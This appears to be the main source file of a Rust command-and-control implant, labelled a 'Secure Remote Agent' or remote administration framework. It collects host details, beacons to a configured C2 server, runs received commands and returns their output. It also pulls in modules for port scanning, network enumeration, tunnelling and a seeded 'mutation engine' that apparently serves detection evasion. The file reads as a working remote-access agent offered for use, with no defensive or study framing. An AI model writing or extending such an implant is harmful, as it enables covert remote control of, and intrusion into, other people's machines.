use log::{info, error, debug};
use std::time::Duration;
use tokio::time::sleep;

mod config;
mod communicator;
mod executor;
mod recon;
mod crypto;
mod mutation;
mod network;
mod port_handler;

use config::Config;
use communicator::{Communicator, BeaconPayload};
use executor::{CommandType, Executor};
use recon::SystemInfo;
use crypto::CryptoManager;
use network::{NetworkConfig, ConnectionMethod, PortScanner, NetworkEnumerator, MultiBeacon};
use port_handler::{PortHandler, PortForwardingTunnel, ProtocolType};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize logging
    env_logger::Builder::from_default_env()
        .format_timestamp_millis()
        .init();

    info!("╔════════════════════════════════════════════════════════╗");
    info!("║  🦀 Secure Remote Agent v0.1.0                        ║");
    info!("║  Remote Administration Framework                       ║");
    info!("╚════════════════════════════════════════════════════════╝");

    // Load configuration
    let config = Config::from_env()?;
    info!("✅ Configuration loaded successfully");

    // Validate configuration
    config.validate()?;
    info!("✅ Configuration validated");

    // Initialize crypto manager
    let crypto = CryptoManager::new(&config.encryption_key)?;
    info!("✅ Encryption subsystem initialized (AES-256-GCM)");

    // Gather system information
    let sys_info = recon::gather_system_info()?;
    info!("✅ System information gathered");
    info!("   Hostname: {}", sys_info.hostname);
    info!("   OS: {} ({})", sys_info.os, sys_info.os_version);
    info!("   Architecture: {}", sys_info.architecture);
    info!("   Agent ID: {}", sys_info.agent_id);

    // Run main agent loop
    info!("🚀 Starting main agent loop...");
    match run_agent(&config, crypto, &sys_info).await {
        Ok(_) => {
            info!("Agent loop completed gracefully");
        }
        Err(e) => {
            error!("Fatal error in agent loop: {}", e);
            std::process::exit(1);
        }
    }

    Ok(())
}

async fn run_agent(
    config: &Config,
    crypto: CryptoManager,
    sys_info: &SystemInfo,
) -> Result<(), Box<dyn std::error::Error>> {
    // Derive a separate mutation seed from the encryption key
    let mutation_seed = {
        use hmac::{Hmac, Mac};
        use sha2::Sha256;
        type HmacSha256 = Hmac<Sha256>;
        let mut mac = <HmacSha256 as Mac>::new_from_slice(&config.encryption_key)
            .expect("HMAC accepts any key size");
        mac.update(b"mutation-engine-seed");
        let result = mac.finalize().into_bytes();
        let mut seed = [0u8; 32];
        seed.copy_from_slice(&result);
        seed
    };

    let mut communicator = communicator::Communicator::new(
        &config.c2_url,
        config.c2_port,
        &sys_info.agent_id,
        config.beacon_interval,
        crypto,
        &mutation_seed,
    );

    let mut reconnect_count = 0;
    let max_reconnects = 10;

    loop {
        // Attempt connection
        match communicator.connect().await {
            Ok(()) => {
                reconnect_count = 0;
                info!("🔗 Connected to C2 server");

                // Send initial beacon
                let beacon = BeaconPayload {
                    agent_id: sys_info.agent_id.clone(),
                    hostname: sys_info.hostname.clone(),
                    os: sys_info.os.clone(),
                    os_version: sys_info.os_version.clone(),
                    architecture: sys_info.architecture.clone(),
                    ip_address: None,
                    user: None,
                    privileges: None,
                };

                match communicator.send_beacon(&beacon).await {
                    Ok(response) => {
                        info!("✅ Initial beacon sent");
                        debug!("Response: {}", response);
                    }
                    Err(e) => {
                        error!("Failed to send beacon: {}", e);
                    }
                }

                // Main command loop
                loop {
                    // Send periodic beacons
                    let beacon = BeaconPayload {
                        agent_id: sys_info.agent_id.clone(),
                        hostname: sys_info.hostname.clone(),
                        os: sys_info.os.clone(),
                        os_version: sys_info.os_version.clone(),
                        architecture: sys_info.architecture.clone(),
                        ip_address: None,
                        user: None,
                        privileges: None,
                    };

                    if let Err(e) = communicator.send_beacon(&beacon).await {
                        error!("Beacon error: {}", e);
                        break;
                    }

                    info!("📡 Beacon sent (interval: {}s)", config.beacon_interval);

                    // Check for incoming commands
                    match communicator.receive_command().await {
                        Ok(Some(cmd_str)) => {
                            info!("📥 Command received: {}", cmd_str);

                            // Parse and execute command
                            if let Ok(cmd) = serde_json::from_str::<CommandType>(&cmd_str) {
                                let result = Executor::execute_command(&cmd).await;
                                info!("✅ Command executed in {}ms", result.execution_time_ms);

                                // Send result back
                                let response = communicator::CommandResponse {
                                    command_id: 1,
                                    status: result.status.clone(),
                                    output: result.output.clone(),
                                    error: result.error.clone(),
                                    execution_time: result.execution_time_ms as u64,
                                };

                                if let Err(e) = communicator.send_command_result(&response).await {
                                    error!("Failed to send command result: {}", e);
                                }
                            } else {
                                error!("Failed to parse command");
                            }
                        }
                        Ok(None) => {
                            debug!("No commands received");
                        }
                        Err(e) => {
                            error!("Error receiving command: {}", e);
                            break;
                        }
                    }

                    // Sleep before next beacon
                    sleep(Duration::from_secs(config.beacon_interval)).await;
                }
            }
            Err(e) => {
                reconnect_count += 1;
                if reconnect_count >= max_reconnects {
                    error!(
                        "Failed to reconnect after {} attempts",
                        max_reconnects
                    );
                    return Err("Reconnection limit reached".into());
                }

                let backoff = 2_u64.pow(reconnect_count as u32);
                error!(
                    "Connection failed (attempt {}/{}), retrying in {}s",
                    reconnect_count, max_reconnects, backoff
                );

                sleep(Duration::from_secs(backoff)).await;
            }
        }
    }
}
